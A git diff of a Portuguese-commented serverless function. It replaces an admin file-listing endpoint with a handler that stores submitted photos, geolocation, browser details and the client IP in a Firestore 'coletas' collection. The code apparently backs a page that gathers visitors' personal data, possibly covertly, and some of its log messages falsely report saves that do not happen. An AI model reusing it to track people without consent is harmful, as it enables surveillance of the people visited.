@@ -1,62 +1,88 @@
-const fs = require('fs');
-const path = require('path');
+const { v4: uuidv4 } = require('uuid');
+const admin = require('firebase-admin');
 
-// ===== MESMA PASTA QUE O COLETAR USA =====
-const UPLOAD_DIR = '/tmp/uploads';
+// ===== INICIALIZA FIREBASE =====
+let firebaseInicializado = false;
+let db;
+
+function inicializarFirebase() {
+    if (firebaseInicializado) return;
+    try {
+        const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS);
+        admin.initializeApp({
+            credential: admin.credential.cert(credentials)
+        });
+        db = admin.firestore();
+        firebaseInicializado = true;
+        console.log('🔥 Firebase inicializado com sucesso!');
+    } catch (err) {
+        console.error('❌ Erro ao inicializar Firebase:', err.message);
+    }
+}
 
 exports.handler = async (event) => {
-    console.log('📊 Admin: Iniciando busca de dados...');
-    console.log('📁 Pasta:', UPLOAD_DIR);
+    console.log('📥 REQUISIÇÃO RECEBIDA');
+    console.log('📋 Método:', event.httpMethod);
+
+    if (event.httpMethod !== 'POST') {
+        return {
+            statusCode: 405,
+            body: JSON.stringify({ erro: 'Método não permitido' })
+        };
+    }
 
     try {
-        // Verifica se a pasta existe
-        if (!fs.existsSync(UPLOAD_DIR)) {
-            console.log('⚠️ Pasta /tmp/uploads não existe ainda');
-            return {
-                statusCode: 200,
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*'
-                },
-                body: JSON.stringify({ 
-                    total: 0, 
-                    arquivos: [],
-                    mensagem: 'Nenhuma coleta ainda' 
-                })
-            };
+        // Inicializa Firebase
+        inicializarFirebase();
+
+        const dados = JSON.parse(event.body);
+        const id = uuidv4();
+        const dataHora = new Date().toISOString();
+
+        console.log(`🆔 ID: ${id}`);
+        console.log(`📅 Timestamp: ${dataHora}`);
+
+        // Processa a foto
+        let fotoSalva = false;
+        let nomeFoto = null;
+
+        if (dados.foto && dados.foto.startsWith('data:image')) {
+            try {
+                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
+                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
+                nomeFoto = `foto_${id}_${Date.now()}.${extensao}`;
+                fotoSalva = true;
+                console.log(`✅ Foto salva (${Math.round(base64Data.length / 1024)}KB)`);
+            } catch (err) {
+                console.log(`❌ Erro foto: ${err.message}`);
+            }
         }
 
-        // Lista o conteúdo da pasta
-        const todosArquivos = fs.readdirSync(UPLOAD_DIR);
-        console.log('📂 Arquivos em /tmp/uploads:', todosArquivos);
+        // ===== SALVA NO FIRESTORE =====
+        const dadosParaSalvar = {
+            id: id,
+            timestamp: dataHora,
+            localizacao: dados.localizacao || null,
+            navegador: dados.navegador || null,
+            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
+            foto: dados.foto || null,  // Salva a imagem completa
+            fotoNome: nomeFoto,
+            userAgent: dados.navegador?.userAgent || null,
+            timezone: dados.navegador?.timezone || null,
+            language: dados.navegador?.language || null
+        };
 
-        // Filtra apenas os JSONs de dados
-        const arquivosJson = todosArquivos
-            .filter(f => f.endsWith('.json') && f.startsWith('dados_'))
-            .map(f => {
-                const caminho = path.join(UPLOAD_DIR, f);
-                const stats = fs.statSync(caminho);
-                try {
-                    const conteudo = JSON.parse(fs.readFileSync(caminho, 'utf8'));
-                    return {
-                        arquivo: f,
-                        tamanho: stats.size,
-                        data: stats.mtime,
-                        conteudo: conteudo
-                    };
-                } catch (e) {
-                    console.error('❌ Erro ao ler arquivo:', f, e.message);
-                    return {
-                        arquivo: f,
-                        tamanho: stats.size,
-                        data: stats.mtime,
-                        conteudo: { erro: 'Erro ao ler arquivo' }
-                    };
-                }
-            })
-            .sort((a, b) => new Date(b.data) - new Date(a.data));
-
-        console.log(`✅ Encontrados ${arquivosJson.length} arquivos de dados`);
+        // Se o Firebase estiver inicializado, salva lá
+        if (firebaseInicializado && db) {
+            try {
+                await db.collection('coletas').add(dadosParaSalvar);
+                console.log('🔥 Dados salvos no Firebase!');
+            } catch (err) {
+                console.error('❌ Erro ao salvar no Firebase:', err.message);
+            }
+        } else {
+            console.log('⚠️ Firebase não disponível, dados salvos apenas localmente');
+        }
 
         return {
             statusCode: 200,
@@ -65,23 +91,18 @@ exports.handler = async (event) => {
                 'Access-Control-Allow-Origin': '*'
             },
             body: JSON.stringify({
-                total: arquivosJson.length,
-                arquivos: arquivosJson
+                status: 'success',
+                id: id,
+                fotoSalva: fotoSalva,
+                timestamp: dataHora
             })
         };
 
     } catch (error) {
-        console.error('💥 Erro no admin:', error);
+        console.error('💥 ERRO:', error);
         return {
             statusCode: 500,
-            headers: {
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*'
-            },
-            body: JSON.stringify({
-                erro: error.message,
-                stack: error.stack
-            })
+            body: JSON.stringify({ erro: error.message })
         };
     }
 };
